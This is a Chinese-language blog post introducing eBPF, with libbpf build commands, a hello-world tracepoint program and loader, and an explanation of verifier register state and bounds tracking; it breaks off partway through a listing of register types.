<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;">
    <title>eBPF</title>
    <link rel="icon" type="image/svg+xml" href="/favicon.svg">
    <link rel="stylesheet" href="/style.css">
</head>
<body>
    <header>
        <nav class="site-nav">
            <a href="/index.html" class="nav-link">/home</a>
            <span class="nav-separator">|</span>
            <a href="/about.html" class="nav-link">/about</a>
        </nav>
        <div class="terminal-prompt">
            <span style="color:#666">[</span><span style="color:#fabd2f">ayoung</span><span style="color:#666">@</span><span style="color:#59adeb">blog</span> <span style="color:#83a598"><a href="/index.html" class="path-link">posts</a></span><span style="color:#666">]$</span> 
            <span class="cmd">cat ./eBPF.md</span><span class="cursor">█</span>
        </div>
        <h1 class="post-title">eBPF</h1><div style="color: #666; font-size: 0.8rem; margin-bottom: 20px;">[Last modified: 2025-04-18]</div>
    </header>
    <div class="layout-grid">
                <main><h2 id="shen-me-shi-ebpf">什么是eBPF</h2><p>eBPF 全称 extended Berkeley Packet Filter，中文意思 扩展的伯克利包过滤器
一般来说，要向内核添加新功能，需要修改内核源代码或者编写 内核模块 来实
eBPF 允许程序在不修改内核源代码，或添加额外的内核模块情况下运行</p>
<p><img src="/images/Pasted%20image%2020241121215446.png" alt="" /></p>
<p>用户态：</p>
<ul>
<li>用户编写eBPF程序，使用eBPF汇编或特有C语言编写</li>
<li>使用LLVM/CLang编译器，将eBPF程序编译成eBPF字节码</li>
<li>调用<code>bpf()</code>系统调用将eBPF字节码加载到内核</li>
</ul>
<p>内核态：</p>
<ul>
<li><code>bpf()</code>系统调用把eBPF字节码加载到内核时，内核会先进行安全验证</li>
<li>使用<code>JIT (Just In Time)</code>将eBPF字节编译成本地机器码（Native Code）</li>
<li>然后根据程序功能，将字节码挂载到内核不同不同运行路径上。当内核运行到这些路径时，就会触发执行相应路径上的eBPF机器码</li>
</ul>
<h2 id="shi-yong-shi-li">使用示例</h2><p>内核源码中
<code>sudo apt install linux-source-6.5.0 </code> 安装源码
<code>tar -jxvf linux-source-6.5.0.tar.bz2</code> 解压
<code>samples/bpf</code> 示例程序 <code>_kern.c</code>内核空间 <code>_user.c</code>用户空间</p>
<p><code>linux-5.10</code>及更早版本才使用<code>bpf_load.h</code>
后期版本使用<code>libbpf</code>，安装<code>libbpf_dev</code></p>
<p>参考 ebpf-hello-world</p>
<p>需要使用libbpf</p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">$ git clone https://github.com/libbpf/libbpf &amp;&amp; cd libbpf/src/
</span><span style="color:#c0c5ce;">$ make BUILD_STATIC_ONLY=1 OBJDIR=../build/libbpf DESTDIR=../build INCLUDEDIR=
</span><span style="color:#c0c5ce;"> LIBDIR= UAPIDIR= install
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">$ bpftool btf dump file /sys/kernel/btf/vmlinux format c &gt; vmlinux.h
</span><span style="color:#c0c5ce;">$ clang -g -O2 -target bpf -D__TARGET_ARCH_x86_64 -I . -c hello.bpf.c -o hello.bpf.o
</span><span style="color:#c0c5ce;">$ bpftool gen skeleton hello.bpf.o &gt; hello.skel.h
</span><span style="color:#c0c5ce;">$ clang -g -O2 -Wall -I . -c hello.c -o hello.o
</span><span style="color:#c0c5ce;">$ clang -Wall -O2 -g hello.o /path/to/libbpf.a -lelf -lz -o hello
</span><span style="color:#c0c5ce;">$ sudo ./hello
</span></pre>
<p>编译命令依次作用：</p>
<ul>
<li>从内核的 BTF（BPF Type Format）信息中提取类型信息，并将其保存到 vmlinux.h 文件中。BTF 是一种类型信息格式，描述了内核对象（如结构体、枚举、函数等）的元数据</li>
<li><code>clang</code>  编译BPF 程序<code>hello.bpf.c</code>为目标文件<code>.o</code></li>
<li>生成 BPF 程序的 "skeleton" 代码，并将其保存为头文件</li>
<li>编译用户空间代码为目标文件<code>.o</code></li>
<li>将用户空间程序与所需的库进行链接，生成可执行文件 <code>hello</code></li>
</ul>
<p>BPF程序
<code>hello_bpf__open</code> 打开并加载由 <code>hello.skel.h</code> 定义的 BPF 程序</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">vmlinux.h</span><span style="color:#c0c5ce;">&quot;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">bpf/bpf_helpers.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#c0c5ce;">
</span><span style="color:#8fa1b3;">SEC</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">tracepoint/syscalls/sys_enter_execve</span><span style="color:#c0c5ce;">&quot;)
</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">tracepoint__syscalls__sys_enter_execve</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> trace_event_raw_sys_enter *</span><span style="color:#bf616a;">ctx</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">bpf_printk</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">Hello world!</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> LICENSE[] </span><span style="color:#8fa1b3;">SEC</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">license</span><span style="color:#c0c5ce;">&quot;) = &quot;</span><span style="color:#a3be8c;">GPL</span><span style="color:#c0c5ce;">&quot;;
</span><span style="color:#c0c5ce;">
</span></pre>
<p>用户空间代码</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/types.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/stat.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">fcntl.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">unistd.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">sys/resource.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">bpf/libbpf.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">bpf/bpf.h</span><span style="color:#c0c5ce;">&gt;
</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">hello.skel.h</span><span style="color:#c0c5ce;">&quot;
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">read_trace_pipe</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">void</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> trace_fd;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	trace_fd = </span><span style="color:#8fa1b3;">open</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/sys/kernel/debug/tracing/trace_pipe</span><span style="color:#c0c5ce;">&quot;, O_RDONLY, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(trace_fd &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">while </span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">static char</span><span style="color:#c0c5ce;"> buf[</span><span style="color:#d08770;">4096</span><span style="color:#c0c5ce;">];
</span><span style="color:#c0c5ce;">		ssize_t sz;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">		sz = </span><span style="color:#8fa1b3;">read</span><span style="color:#c0c5ce;">(trace_fd, buf, sizeof(buf) - </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(sz &gt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">			buf[sz] = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">			</span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(buf);
</span><span style="color:#c0c5ce;">		}
</span><span style="color:#c0c5ce;">	}
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">main</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">void</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> hello_bpf *obj;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> err = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> rlimit rlim = {
</span><span style="color:#c0c5ce;">		.</span><span style="color:#bf616a;">rlim_cur </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">512UL </span><span style="color:#c0c5ce;">&lt;&lt; </span><span style="color:#d08770;">20</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">		.</span><span style="color:#bf616a;">rlim_max </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">512UL </span><span style="color:#c0c5ce;">&lt;&lt; </span><span style="color:#d08770;">20</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">	};
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	err = </span><span style="color:#8fa1b3;">setrlimit</span><span style="color:#c0c5ce;">(RLIMIT_MEMLOCK, &amp;rlim);
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(err) {
</span><span style="color:#c0c5ce;">		</span><span style="color:#96b5b4;">fprintf</span><span style="color:#c0c5ce;">(stderr, &quot;</span><span style="color:#a3be8c;">failed to change rlimit</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">return </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">	}
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	obj = </span><span style="color:#8fa1b3;">hello_bpf__open</span><span style="color:#c0c5ce;">();
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(!obj) {
</span><span style="color:#c0c5ce;">		</span><span style="color:#96b5b4;">fprintf</span><span style="color:#c0c5ce;">(stderr, &quot;</span><span style="color:#a3be8c;">failed to open and/or load BPF object</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">return </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">	}
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	err = </span><span style="color:#8fa1b3;">hello_bpf__load</span><span style="color:#c0c5ce;">(obj);
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(err) {
</span><span style="color:#c0c5ce;">		</span><span style="color:#96b5b4;">fprintf</span><span style="color:#c0c5ce;">(stderr, &quot;</span><span style="color:#a3be8c;">failed to load BPF object </span><span style="color:#d08770;">%d</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, err);
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">goto</span><span style="color:#c0c5ce;"> cleanup;
</span><span style="color:#c0c5ce;">	}
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	err = </span><span style="color:#8fa1b3;">hello_bpf__attach</span><span style="color:#c0c5ce;">(obj);
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(err) {
</span><span style="color:#c0c5ce;">		</span><span style="color:#96b5b4;">fprintf</span><span style="color:#c0c5ce;">(stderr, &quot;</span><span style="color:#a3be8c;">failed to attach BPF programs</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">goto</span><span style="color:#c0c5ce;"> cleanup;
</span><span style="color:#c0c5ce;">	}
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">read_trace_pipe</span><span style="color:#c0c5ce;">();
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">cleanup:
</span><span style="color:#c0c5ce;">	</span><span style="color:#8fa1b3;">hello_bpf__destroy</span><span style="color:#c0c5ce;">(obj);
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> err != </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span></pre>
<h2 id="ebpf-xu-ni-ji">eBPF 虚拟机</h2><table><thead><tr><th>eBPF 寄存器</th><th>映射 x86_64 寄存器</th><th>用途</th></tr></thead><tbody>
<tr><th>R0</th><th>rax</th><th>函数返回值</th></tr>
<tr><th>R1</th><th>rdi</th><th>argv1</th></tr>
<tr><th>R2</th><th>rsi</th><th>argv2</th></tr>
<tr><th>R3</th><th>rdx</th><th>argv3</th></tr>
<tr><th>R4</th><th>rcx</th><th>argv4</th></tr>
<tr><th>R5</th><th>r8</th><th>argv5</th></tr>
<tr><th>R6</th><th>rbx</th><th>callee 保存</th></tr>
<tr><th>R7</th><th>r13</th><th>callee 保存</th></tr>
<tr><th>R8</th><th>r14</th><th>callee 保存</th></tr>
<tr><th>R9</th><th>r15</th><th>callee 保存</th></tr>
<tr><th>R10 (只读)</th><th>rbp</th><th>堆栈指针寄存器</th></tr>
<tr><th>r1-r5 五个寄存器用作eBPF中函数调用传参，只能保存常数或指向堆栈的指针，所有内存访问都需要先把数据加载到eBPF堆栈中才能使用，这种限制简化了 eBPF 的内存模型，也更方便 verifier 进行检查</th><th></th><th></th></tr>
</tbody></table>
<p><img src="/images/Pasted%20image%2020241125185346.png" alt="" /></p>
<h3 id="bpf-reg-state">bpf_reg_state</h3><pre style="background-color:#2b303b;">
<span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">bpf_reg_state {
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">/* 各字段的顺序是重要的.  参见 states_equal() */
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">enum</span><span style="color:#c0c5ce;"> bpf_reg_type type;
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">/* 指针偏移的固定部分, 仅指针类型 */
</span><span style="color:#c0c5ce;">	s32 off;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">union </span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">		</span><span style="color:#65737e;">/* 当 type == PTR_TO_PACKET 时可用 */
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> range;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">		</span><span style="color:#65737e;">/* 当 type == CONST_PTR_TO_MAP | PTR_TO_MAP_VALUE |
</span><span style="color:#65737e;">		 *   PTR_TO_MAP_VALUE_OR_NULL 时可用
</span><span style="color:#65737e;">		 */
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">			</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">bpf_map *map_ptr;
</span><span style="color:#c0c5ce;">			</span><span style="color:#65737e;">/* 为了从外部映射中区分映射查找
</span><span style="color:#65737e;">			 * map_uid 对于指向内部映射的寄存器为非 0 值
</span><span style="color:#65737e;">			 */
</span><span style="color:#c0c5ce;">			u32 map_uid;
</span><span style="color:#c0c5ce;">		};
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">		</span><span style="color:#65737e;">/* for PTR_TO_BTF_ID */
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">			</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">btf *btf;
</span><span style="color:#c0c5ce;">			u32 btf_id;
</span><span style="color:#c0c5ce;">		};
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">{ </span><span style="color:#65737e;">/* for PTR_TO_MEM | PTR_TO_MEM_OR_NULL */
</span><span style="color:#c0c5ce;">			u32 mem_size;
</span><span style="color:#c0c5ce;">			u32 dynptr_id; </span><span style="color:#65737e;">/* for dynptr slices */
</span><span style="color:#c0c5ce;">		};
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">		</span><span style="color:#65737e;">/* For dynptr stack slots */
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">			</span><span style="color:#b48ead;">enum</span><span style="color:#c0c5ce;"> bpf_dynptr_type type;
</span><span style="color:#c0c5ce;">			</span><span style="color:#65737e;">/* 一个 dynptr 为 16 字节， 故其占用 2 个 stack slots.
</span><span style="color:#65737e;">			 * 我们需要追踪哪一个 slot 为第一个防止用户可能尝试传入一个从
</span><span style="color:#65737e;">			 * dynptr 的第二个 slot 开始的地址的情况的 slot.
</span><span style="color:#65737e;">			 */
</span><span style="color:#c0c5ce;">			</span><span style="color:#b48ead;">bool</span><span style="color:#c0c5ce;"> first_slot;
</span><span style="color:#c0c5ce;">		} dynptr;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">		</span><span style="color:#65737e;">/* 以上任意一个的最大尺寸. */
</span><span style="color:#c0c5ce;">		</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">			</span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;"> raw1;
</span><span style="color:#c0c5ce;">			</span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;"> raw2;
</span><span style="color:#c0c5ce;">		} raw;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">		u32 subprogno; </span><span style="color:#65737e;">/* for PTR_TO_FUNC */
</span><span style="color:#c0c5ce;">	};
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">/* 对于标量类型 (SCALAR_VALUE), 其表示我们对实际值的了解.
</span><span style="color:#65737e;">	 * 对于指针类型, 其表示从被指向对象的偏移的可变部分，
</span><span style="color:#65737e;">	 * 且同与我们有相同 id 的所有 bpf_reg_states 共享.
</span><span style="color:#65737e;">	 */
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> tnum var_off;
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">/* 被用于确定任何使用该寄存器的内存访问是否将导致一个坏的访问.
</span><span style="color:#65737e;">	 * These refer to the same value as var_off, not necessarily the actual
</span><span style="color:#65737e;">	 * contents of the register.
</span><span style="color:#65737e;">	 */
</span><span style="color:#c0c5ce;">	s64 smin_value; </span><span style="color:#65737e;">/* 最小可能值 (s64) */
</span><span style="color:#c0c5ce;">	s64 smax_value; </span><span style="color:#65737e;">/* 最大可能值 (s64) */
</span><span style="color:#c0c5ce;">	u64 umin_value; </span><span style="color:#65737e;">/* 最小可能值 (u64) */
</span><span style="color:#c0c5ce;">	u64 umax_value; </span><span style="color:#65737e;">/* 最大可能值 (u64) */
</span><span style="color:#c0c5ce;">	s32 s32_min_value; </span><span style="color:#65737e;">/* 最小可能值 (s32) */
</span><span style="color:#c0c5ce;">	s32 s32_max_value; </span><span style="color:#65737e;">/* 最大可能值 (s32) */
</span><span style="color:#c0c5ce;">	u32 u32_min_value; </span><span style="color:#65737e;">/* 最小可能值 (u32) */
</span><span style="color:#c0c5ce;">	u32 u32_max_value; </span><span style="color:#65737e;">/* 最大可能值 (u32) */
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">/* 对于 PTR_TO_PACKET, 用以找到有着相同变量偏移的其他指针，
</span><span style="color:#65737e;">	 * 由此他们可以共享范围信息.
</span><span style="color:#65737e;">	 * 对于 PTR_TO_MAP_VALUE_OR_NULL 其被用于共享我们来自哪一个映射值
</span><span style="color:#65737e;">	 * 当其一被测试于 != NULL.
</span><span style="color:#65737e;">	 * 对于 PTR_TO_MEM_OR_NULL 其被用于辨识内存分配以追踪其释放.
</span><span style="color:#65737e;">	 * 对于 PTR_TO_SOCKET 其被用于共享哪一个指针保留了对 socket 的相同引用，
</span><span style="color:#65737e;">	 * 以确定合适的引用释放.
</span><span style="color:#65737e;">	 * 对于作为 dynptrs 的 stack slots, 其被用于追踪对 dynptr的引用
</span><span style="color:#65737e;">	 * 以确定合适的引用释放.
</span><span style="color:#65737e;">	 */
</span><span style="color:#c0c5ce;">	u32 id;
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">/* PTR_TO_SOCKET 与 PTR_TO_TCP_SOCK 可以为一个返回自一个 pointer-cast helper
</span><span style="color:#65737e;">	 * bpf_sk_fullsock() 与 bpf_tcp_sock() 的指针 .
</span><span style="color:#65737e;">	 *
</span><span style="color:#65737e;">	 * 考虑如下情况， &quot;sk&quot; 为一个返回自 &quot;sk = bpf_sk_lookup_tcp();&quot; 的引用计数指针:
</span><span style="color:#65737e;">	 *
</span><span style="color:#65737e;">	 * 1: sk = bpf_sk_lookup_tcp();
</span><span style="color:#65737e;">	 * 2: if (!sk) { return 0; }
</span><span style="color:#65737e;">	 * 3: fullsock = bpf_sk_fullsock(sk);
</span><span style="color:#65737e;">	 * 4: if (!fullsock) { bpf_sk_release(sk); return 0; }
</span><span style="color:#65737e;">	 * 5: tp = bpf_tcp_sock(fullsock);
</span><span style="color:#65737e;">	 * 6: if (!tp) { bpf_sk_release(sk); return 0; }
</span><span style="color:#65737e;">	 * 7: bpf_sk_release(sk);
</span><span style="color:#65737e;">	 * 8: snd_cwnd = tp-&gt;snd_cwnd;  // verifier 将抗议
</span><span style="color:#65737e;">	 *
</span><span style="color:#65737e;">	 * 在第 7 行的 bpf_sk_release(sk) 之后, &quot;fullsock&quot; 指针与
</span><span style="color:#65737e;">	 * &quot;tp&quot; 指针都应当被无效化.  为了这么做, 保存 &quot;fullsock&quot; 与 &quot;sk&quot;
</span><span style="color:#65737e;">	 * 的寄存器需要记住在 ref_obj_id 中的原始引用计数指针 id(即， sk_reg-&gt;id)
</span><span style="color:#65737e;">	 * 这样 verifier 便能重置所有 ref_obj_id 匹配 sk_reg-&gt;id 的寄存器
</span><span style="color:#65737e;">	 *
</span><span style="color:#65737e;">	 * sk_reg-&gt;ref_obj_id 在第 1 行被设为 sk_reg-&gt;id.
</span><span style="color:#65737e;">	 * sk_reg-&gt;id 将仅作为 NULL-marking 的目的保持.
</span><span style="color:#65737e;">	 * 在 NULL-marking 完成后, sk_reg-&gt;id 可以被重置为 0.
</span><span style="color:#65737e;">	 *
</span><span style="color:#65737e;">	 * 在第 3 行的 &quot;fullsock = bpf_sk_fullsock(sk);&quot; 之后,
</span><span style="color:#65737e;">	 * fullsock_reg-&gt;ref_obj_id 被设为 sk_reg-&gt;ref_obj_id.
</span><span style="color:#65737e;">	 *
</span><span style="color:#65737e;">	 * 在第 5 行的 &quot;tp = bpf_tcp_sock(fullsock);&quot; 之后,
</span><span style="color:#65737e;">	 * tp_reg-&gt;ref_obj_id 被设为 fullsock_reg-&gt;ref_obj_id
</span><span style="color:#65737e;">	 * 与 sk_reg-&gt;ref_obj_id 一致.
</span><span style="color:#65737e;">	 *
</span><span style="color:#65737e;">	 * 从 verifier 的角度而言, 若 sk, fullsock 与 tp 都非 NULL,
</span><span style="color:#65737e;">	 * 他们为有着不同 reg-&gt;type 的相同指针.
</span><span style="color:#65737e;">	 * 特别地, bpf_sk_release(tp) 也被允许且有着与 bpf_sk_release(sk) 
</span><span style="color:#65737e;">	 * 相同的影响.
</span><span style="color:#65737e;">	 */
</span><span style="color:#c0c5ce;">	u32 ref_obj_id;
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">/* 用于存活检查的亲子链 */
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">bpf_reg_state *parent;
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">/* 在被调用方中两个寄存器可以同时为 PTR_TO_STACK 如同 R1=fp-8 与 R2=fp-8,
</span><span style="color:#65737e;">	 * 但其一指向该函数栈而另一指向调用方的栈. 为了区分他们 &#39;frameno&#39; 被使用，
</span><span style="color:#65737e;">	 * 其为一个指向 bpf_func_state 的 bpf_verifier_state-&gt;frame[] 数组中的下标.
</span><span style="color:#65737e;">	 */
</span><span style="color:#c0c5ce;">	u32 frameno;
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">/* 追踪子寄存器（subreg）定义. 保存的值为写入 insn 的 insn_idx.
</span><span style="color:#65737e;">	 * 这是安全的因为 subreg_def 在任何仅在主校验结束后发生的 insn 修补前被使用.
</span><span style="color:#65737e;">	 */
</span><span style="color:#c0c5ce;">	s32 subreg_def;
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">enum</span><span style="color:#c0c5ce;"> bpf_reg_liveness live;
</span><span style="color:#c0c5ce;">	</span><span style="color:#65737e;">/* if (!precise &amp;&amp; SCALAR_VALUE) min/max/tnum don&#39;t affect safety */
</span><span style="color:#c0c5ce;">	</span><span style="color:#b48ead;">bool</span><span style="color:#c0c5ce;"> precise;
</span><span style="color:#c0c5ce;">};
</span></pre>
<p>寄存器运行时值与边界范围校验
verifier 会模拟执行每一条指令并验证寄存器的值是否合法，主要关注这几个字段：</p>
<ul>
<li><code>smin_value</code>、<code>smax_value</code>： 64 位有符号的值的可能取值边界</li>
<li><code>umin_value</code>、<code>umax_value</code>：64 位无符号的值的可能取值边界</li>
<li><code>s32_min_value</code>、<code>s32_max_value</code>：32 位有符号的值的可能取值边界</li>
<li><code>u32_min_value</code>、<code>u32_max_value</code>：32 位无符号的值的可能取值边界</li>
</ul>
<p>寄存器中可以确定的值通过<code>var_off</code>字段表示，该值使用<code>tnum</code>结构体表示
mask 中为 0 对应的 value 位为已知位：</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">struct </span><span style="color:#c0c5ce;">tnum {
</span><span style="color:#c0c5ce;">	u64 value;
</span><span style="color:#c0c5ce;">	u64 mask;
</span><span style="color:#c0c5ce;">};
</span></pre>
<p>一个 verifier 完全未知的寄存器如下：</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">const struct</span><span style="color:#c0c5ce;"> tnum tnum_unknown = { .</span><span style="color:#bf616a;">value </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, .</span><span style="color:#bf616a;">mask </span><span style="color:#c0c5ce;">= -</span><span style="color:#d08770;">1 </span><span style="color:#c0c5ce;">};
</span></pre>
<p>寄存器边界值是 verifier 通过模拟执行推测出来的，运行时的寄存器值不一定与 verifier 所推测的一致，这也曾是很多 eBPF 漏洞产生的原因</p>
<h3 id="ji-cun-qi-lei-xing">寄存器类型</h3><p>寄存器在程序运行的不同阶段可能存放着不同类型的值，verifier 通过跟踪寄存器值的类型来防止越界访问的发生，主要有三类：</p>
<ul>
<li>未初始化（not init）：寄存器初始状态，未经过任何赋值操作，此类寄存器不能参与运算</li>
<li>标量值（scalar）：该寄存器被赋予整型值，此类寄存器不能作为指针进行内存访问</li>
<li>指针类型（pointer）：该寄存器为一个指针，verifier 会检查内存访问是否超出指针允许的范围</li>
<li>实际上按用途不同划分更细类型，如<code>PTR_TO_STACK</code></li>
</ul>
<pre style="background-color:#2b303b;">
<span style="color:#65737e;">/* types of values stored in eBPF registers */
</span><span style="color:#65737e;">/* Pointer types represent:
</span><span style="color:#65737e;"> * pointer
</span><span style="color:#65737e;"> * pointer + imm
</span><span style="color:#65737e;"> * pointer + (u16) var
</span><span style="color:#65737e;"> * pointer + (u16) var + imm
